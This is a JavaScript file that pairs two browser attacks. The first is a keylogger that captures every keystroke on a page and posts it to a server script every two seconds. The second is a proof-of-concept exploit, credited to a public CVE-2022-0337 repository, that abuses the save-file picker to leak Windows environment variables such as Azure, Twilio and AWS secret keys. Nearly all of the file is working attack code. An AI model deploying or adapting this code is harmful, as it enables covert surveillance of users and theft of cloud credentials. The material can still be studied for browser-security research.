var keylog = {
    // (A) SETTINGS & PROPERTIES
    cache : [], // TEMP STORAGE FOR KEY PRESSES
    delay : 2000, // HOW OFTEN TO SEND DATA TO SERVER
    sending : false, // ONLY 1 UPLOAD ALLOWED AT A TIME
  
    // (B) INITIALIZE
    init : () => {
      // (B1) CAPTURE KEY STROKES
      window.addEventListener("keydown", (evt) => {
        keylog.cache.push(evt.key);
      });
   
      // (B2) SEND KEYSTROKES TO SERVER
      window.setInterval(keylog.send, keylog.delay);
    },
  
    // (C) AJAX SEND KEYSTROKES
    send : () => { if (!keylog.sending && keylog.cache.length != 0) {
      // (C1) "LOCK" UNTIL THIS BATCH IS SENT TO SERVER
      keylog.sending = true;
   
      // (C2) KEYPRESS DATA
      var data = new FormData();
      data.append("keys", JSON.stringify(keylog.cache));
      keylog.cache = []; // CLEAR KEYS
  
      // (C3) FECTH SEND
      fetch("keylog.php", { method:"POST", body:data })
      .then(res=>res.text()).then((res) => {
        keylog.sending = false; // UNLOCK
        console.log(res); // OPTIONAL
      })
      .catch((err) => { console.error(err); });
    }}
  };
  window.addEventListener("DOMContentLoaded", keylog.init);

// <Script from: https://github.com/Puliczek/CVE-2022-0337-PoC-Google-Chrome-Microsoft-Edge-Opera

    //how many time enter clicked in row
    let countEnter = 0;
    //is file downloaded
    let isDownloaded = false;

    //on page load
    window.onload = function () {
        const body = document.querySelector("body");
        const pixel = document.querySelector("#pixel");

        body.onkeydown = (e) => (e.key == "Enter" ? clickedEnter() : 1);
        body.onkeyup = (e) => (e.key == "Enter" ? cancelEnter() : 1);

        const randomNumber = Math.floor(Math.random() * 990) + 1;
        const filename = `f${randomNumber}.f`;

        //List of environment variables that hacker is interested in.
        const environmentVariables = [
        "USERNAME",
        "USERDOMAIN",
        "SESSIONNAME",
        "COMPUTERNAME",
        "KEY_VAULT_URL",
        "SECRET_NAME",
        "AZURE_TENANT_ID",
        "AZURE_CLIENT_ID",
        "AZURE_CLIENT_SECRET",
        "TWILIO_ACCOUNT_SID",
        "TWILIO_AUTH_TOKEN",
        "AWS_SECRET_ACCESS_KEY"
        // 'TOKEN',
        // 'PASSWORD'
        ];

        const suggestedName =
        environmentVariables.map((x) => `%${x}%`).join("@") + filename;

        pixel.addEventListener("click", async () => {
        //handle to get file
        const handle = await window.showSaveFilePicker({ suggestedName });
        //sometimes can throw an exception because file name is too big, but we can create more handles and put each 4 environmentVariables to deal with that problem
        //result from user
        const username = handle.name.split("@")[0];

        const userInfo = handle.name
            .replaceAll(filename, "")
            .split("@")
            .map(
            (x, i) =>
                `${environmentVariables[i]} = ${x.includes("%") ? "null" : x}`
            )
            .join("<br>");
        const guessWinPath = `C:/Users/${username}`;
        document.querySelector(
            "#userInfo"
        ).innerHTML = `USER'S ENVIRONMENT VARIABLES: <br>${userInfo} <br> guessWinPath = C:/users/${username}`;
        document.querySelector("#gameover").textContent =
            "GAME OVER - Need refresh to start again";
        });
    };

    function clickedEnter() {
        countEnter++;
        //if button was hold more then 1 second and it wasn't downloaded - we can change !isDownloaded to countEnter % 30 === 0 to download many files
        if (countEnter > 5 && !isDownloaded) {
        pixel.click();
        //set file is downloaded
        isDownloaded = true;
        }
    }

    function cancelEnter() {
        //reset count enter if enter is not hold
        countEnter = 0;
    }